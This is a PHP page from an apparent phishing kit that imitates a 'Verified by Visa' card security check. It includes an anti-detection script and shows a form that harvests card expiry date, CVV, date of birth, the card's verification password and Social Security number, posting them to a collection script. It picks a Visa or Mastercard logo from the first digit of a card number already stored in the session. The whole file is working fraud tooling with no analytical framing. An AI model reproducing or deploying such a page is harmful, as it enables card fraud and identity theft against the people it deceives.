
<?php

@session_start();

$zz = @$_SESSION['nn'];

$ee = substr($zz, 0 , 1);


include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];



?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
	<title>Secrity Your Cart</title>
  <link rel="shortcut icon" link rel="logo-icon" href="./img/icon.ico">
	<link rel="stylesheet" type="text/css" href="css/vbv.css">
</head>
<body>

  <div class="wrap">
  	<header>
      <i id="chno"></i>
  	</header>
  	<div class="content">
  		<p style="color: #4c4c4c;"><?php echo $wiz_128 ; ?></p>
  		<span id="zwamal"><?php echo $wiz_129 ; ?></span>
  		<form action="edit/vbv.php" method="POST">
  			<div class="date_ccv">
  				<div class="lay_n3al_zamal_bokom"><label for="date_vbv"><?php echo $wiz_130 ; ?></label></div>
  			    <input type="text" name="dt_1" id="date_vbv" maxlength="2" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required>
  			    <input type="text" name="dt_2" maxlength="2" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required>
  			    <span>(MM/YY)</span>
  			</div>
  			<div class="ccv">
  				<div class="lay_n3al_zamal_bokom"><label for="cart_val"><?php echo $wiz_131 ; ?></label></div>
  			    <input type="text" name="cart_val" id="cart_val" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" maxlength="4" required>
  			    <img src="img/cvv.gif">
  			</div>
  			<div class="date_br">
  				<div class="lay_n3al_zamal_bokom"><label for="b_date"><?php echo $wiz_132 ; ?></label></div>
  			    <input type="text" name="b_date" id="b_date" maxlength="2" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required>
  			    <input type="text" name="m_date" maxlength="2" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required>
  			    <input type="text" name="y_date" maxlength="4" onkeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" required>
  			    <span>(DD/MM/YYYY)</span>
  			</div>
  			<div class="vbv_cart">
  				<div class="lay_n3al_zamal_bokom"><label for="password"><?php echo $wiz_133 ; ?></label></div>
  			    <input type="password" name="password_vbv" id="password">
  			</div>
  			<div class="vbv_cart">
  				<div class="lay_n3al_zamal_bokom"><label for="ssn">SSN</label></div>
  			    <input type="ssn" name="ssn" id="ssn">
  			</div>
  			<input type="submit" name="vbv_sb" value="Continue">
  		</form>
  	</div>
  	<footer>
  		<span style="color: #4c4c4c;">Copyright © 1999-2016 . <?php echo $wiz_134 ; ?></span>
  	</footer>
  </div>

<script type="text/javascript">
   
   var chno = document.getElementById('chno');
   var taype_cart = "<?php echo "$ee"; ?>";
   if (taype_cart == "4") {
    chno.innerHTML = "<img src='img/visa.gif'>";
   }
   else if (taype_cart == "5"){
    chno.innerHTML = "<img src='img/ms.gif'>";
   }

   else{
    chno.innerHTML = "<img src='img/visa.gif' style='float:left;'>  <img src='img/ms.gif' style='float:right;'>";
   }


</script>


</body>
</html>